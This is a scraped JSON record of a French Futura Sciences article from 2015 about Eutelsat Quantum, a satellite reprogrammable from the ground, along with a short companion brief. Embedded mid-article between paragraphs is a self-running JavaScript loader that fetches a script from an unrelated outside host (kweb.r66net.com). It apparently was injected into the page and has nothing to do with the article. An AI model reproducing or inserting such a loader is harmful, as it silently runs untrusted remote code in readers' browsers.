{"title": "Eutelsat Quantum, un satellite de telecommunications inedit", "newspaper": "Futura Sciences", "author": ["Remy Decourt"], "date_publi": "2015-07-13", "content": "Avec Quantum, Eutelsat et Airbus Defence and Space realisent un satellite capable de desservir n'importe quelle region du Globe et d'adapter sa mission aux besoins des clients. Une premiere dans l'industrie des satellites de telecommunications commerciaux. Les explications avec Yohann Leroy, directeur technique d'Eutelsat.  Avec Eutelsat Quantum, le <<  domaine des telecommunications par satellite pourrait bien connaitre une petite revolution  >>, nous explique Yohann Leroy, directeur technique d'Eutelsat. Ce futur satellite est le premier d'une nouvelle generation d'appareils entierement reprogrammables par logiciel et concus <<  pour etre flexibles pendant toute leur vie, en s'adaptant en permanence aux conditions du marche ou aux besoins des clients qu'ils servent  >>. En permettant aux clients des segments de la mobilite, des services aux gouvernements et des donnees de definir et de configurer la performance et la zone de couverture du satellite en fonction de leurs besoins, <<  Eutelsat Quantum ouvre une nouvelle ere dans l'histoire des satellites commerciaux  >>. Dit autrement, ce satellite est concu pour s'adapter aux besoins de ses clients tout au long de sa duree de vie, <<  ce qui, aujourd'hui, n'est pas le cas  >>. En effet, actuellement, les  satellites de telecommunications  sont lances pour <<  couvrir une zone geographique determinee et fonctionner avec une meme frequence predefinie tout au long de la duree de leur vie operationnelle  >>. Concretement, de nombreux parametres de la charge utile d'Eutelsat Quantum seront reconfigurables depuis le sol. Ainsi, l'operateur du satellite pourra, selon ses besoins, <<  adapter a distance, en temps reel, ses principaux parametres : zone de couverture,  frequences , debit, puissance...  >>. Il s'agira egalement du <<  premier satellite capable de desservir, plusieurs fois au cours de sa vie et sans changer de position  orbitale , plusieurs regions du Globe  >>, alors que d'habitude les satellites de telecommunications couvrent une zone predefinie. Eutelsat Quantum sera lance en 2019. (c) Airbus DS                       Vers une industrialisation plus poussee des satellites Ce satellite repond a des besoins commerciaux et industriels. Commerciaux dans la mesure ou Eutelsat Quantum permet une <<  tres grande adaptabilite sur des marches qui sont, par nature, incertains, ou la demande peut varier et connaitre des pics et des creux d'activite et des changements de localisation geographique  >>.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Ainsi, la ou il fallait deux ou plusieurs satellites pour gerer une demande variable dans le temps comme dans l'espace, <<  un seul suffira demain  >>. Une compagnie de paquebots peut utiliser Eutelsat Quantum pour fournir un  internet  haut debit a ses clients quand ses bateaux <<  croisent en Mediterranee l'ete et l'hiver dans les Caraibes  >>. Lors de catastrophes naturelles, Eutelsat Quantum viendra <<  renforcer de facon temporaire les capacites satellitaires existantes ou recreer des liens telecoms  >>. Autre exemple : des forces armees en intervention dans un pays etranger, sous l'egide de l'ONU, utiliseront Eutelsat Quantum en prevision d'un surcroit de trafic de telecommunications. Eutelsat imagine aussi des debouches dans le domaine de la securite, civile comme militaire, <<  quand il faut bouger d'un theatre d'operation a un autre  >>. On peut aussi imaginer qu'emergent d'Eutelsat Quantum de nouveaux services et applications. Pour Eutelsat, ce satellite est aussi le <<  premier d'une nouvelle generation  [...]  qui ouvre la voie vers une industrialisation plus poussee des satellites  >>. C'est-a-dire qu'il permet de repenser la facon dont ces derniers sont construits, en passant d'un <<  modele  artisanal de haute technologie , a un modele de production en mini-serie, voire en serie  >>. Pour cela, Eutelsat Quantum utilisera des composants generiques, disponibles sur etageres, ce qui permettra d'abaisser les delais et les couts de production. Ce satellite sera construit au Royaume-Uni par Airbus Defence and Space, qui s'appuiera sur une nouvelle plateforme elaboree par sa filiale, Surrey Satellite Technology Ltd. Certaines des technologies presentes seront developpees avec le soutien de l' Agence spatiale europeenne  (ESA). Ce satellite sera lance en 2019. Pour en savoir plus En bref : un satellite de telecommunications... a tout faire Article de Remy Decourt publie le 13/07/2015 Il s'appellera Quatum et devrait etre le premier satellite reconfigurable en  orbite . Si la demande du client change ou si le marche evolue, ce satellite de telecommunications sur lequel travaille Airbus Defence and Space pourra etre reprogramme depuis le sol. Frequences,  bande passante  et couverture pourront etre ainsi modifiees par voie logicielle. L'industrie spatiale est un environnement actif et changeant, avec par exemple plus de  mille satellites a lancer  dans les prochaines annees. Les acteurs du domaine doivent donc s'adapter en permanence, comme le montre la conception de la future  Ariane 6 , et c'est tout aussi vrai pour les satellites de telecommunications. Apres  Ka-Sat , un satellite pour recevoir Internet partout, AlphaSat, le satellite de telecommunications commerciales sophistique et travaille sur le satellite electrique , Airbus Defence and Space etudie un satellite reconfigurable en orbite. Quantum, c'est son nom, sera en effet capable de s'adapter a de nouvelles demandes en  matiere  de couverture, c'est-a-dire qu'il couvrira n'importe quelle region du Globe, de bande passante, de puissance, de configuration de frequence et de changement de position orbitale. Jusqu'ici, pour repondre a de telles evolutions des besoins du client, il fallait lancer un nouveau satellite. Equipe d'antennes-reseau a commande de phase et d'une connectivite flexible, totalement reconfigurables en orbite par voie logicielle, Quantum pourra ajuster sa couverture et sa capacite a volonte, explique  Airbus DS  dans son communique de presse. Ce satellite sera realise dans le cadre d'un partenariat public prive avec l'Agence spatiale europeenne et  Eutelsat , l'operateur de satellite europeen qui l'operera et le commercialisera. ", "theme": "sciences"}